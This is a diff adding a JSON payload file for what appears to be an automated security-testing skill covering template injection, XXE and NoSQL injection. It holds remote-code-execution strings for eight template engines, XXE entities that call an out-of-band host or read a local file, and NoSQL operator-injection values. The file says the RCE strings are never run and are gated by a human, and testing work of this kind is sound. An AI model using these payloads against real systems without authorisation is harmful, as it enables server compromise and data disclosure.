@@ -1,0 +1,63 @@
+{
+  "_meta": {
+    "description": "Payloads for injection-battery-xxe-ssti-nosql. SSTI RCE strings are PoCs the skill NEVER executes -- they are emitted for human-gated escalation only. XXE uses OOB canaries and a benign file probe; no entity-expansion (DoS) payloads. NoSQL uses read-only operator inference.",
+    "sources": [
+      "https://github.com/danielmiessler/SecLists/tree/master/Fuzzing",
+      "https://github.com/swisskyrepo/PayloadsAllTheThings (reference)"
+    ],
+    "version": "1.0"
+  },
+
+  "ssti_arithmetic_wrappers": [
+    "{{ EXPR }}",
+    "${ EXPR }",
+    "#{ EXPR }",
+    "{ EXPR }",
+    "<%= EXPR %>",
+    "${{ EXPR }}",
+    "#set($ssti=EXPR)$ssti",
+    "*{ EXPR }"
+  ],
+
+  "ssti_engines": [
+    {"name": "Jinja2", "context": "python",
+     "distinctive": "{{7*'7'}}", "distinctive_expect": "7777777",
+     "rce_poc": "{{ cycler.__init__.__globals__.os.popen('id').read() }}"},
+    {"name": "Twig", "context": "php",
+     "distinctive": "{{7*'7'}}", "distinctive_expect": "49",
+     "rce_poc": "{{['id']|filter('system')}}"},
+    {"name": "Smarty", "context": "php",
+     "distinctive": "{7*7}", "distinctive_expect": "49",
+     "rce_poc": "{system('id')}"},
+    {"name": "Freemarker", "context": "java",
+     "distinctive": "${7*7}", "distinctive_expect": "49",
+     "rce_poc": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"},
+    {"name": "Thymeleaf", "context": "java",
+     "distinctive": "[[${7*7}]]", "distinctive_expect": "49",
+     "rce_poc": "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]"},
+    {"name": "Velocity", "context": "java",
+     "distinctive": "#set($x=7*7)$x", "distinctive_expect": "49",
+     "rce_poc": "#set($e=$x.getClass().forName('java.lang.Runtime')) ... (manual)"},
+    {"name": "ERB", "context": "ruby",
+     "distinctive": "<%= 7*7 %>", "distinctive_expect": "49",
+     "rce_poc": "<%= `id` %>"},
+    {"name": "Mako", "context": "python",
+     "distinctive": "${7*7}", "distinctive_expect": "49",
+     "rce_poc": "${__import__('os').popen('id').read()}"}
+  ],
+
+  "xxe": {
+    "oob_param": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % ext SYSTEM \"http://{OOB}/x\"> %ext;]><r>ping</r>",
+    "file_inband": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file://{FILE}\">]><r>&xxe;</r>",
+    "benign_file": "/etc/hostname",
+    "note": "No entity-expansion / billion-laughs payloads. IAM/secret file paths are not probed."
+  },
+
+  "nosql_operators": [
+    {"label": "$ne_null", "op": {"$ne": null}},
+    {"label": "$gt_empty", "op": {"$gt": ""}},
+    {"label": "$regex_all", "op": {"$regex": ".*"}},
+    {"label": "$exists_true", "op": {"$exists": true}}
+  ],
+  "nosql_bracket_forms": ["[$ne]=", "[$gt]=", "[$regex]=.*"]
+}
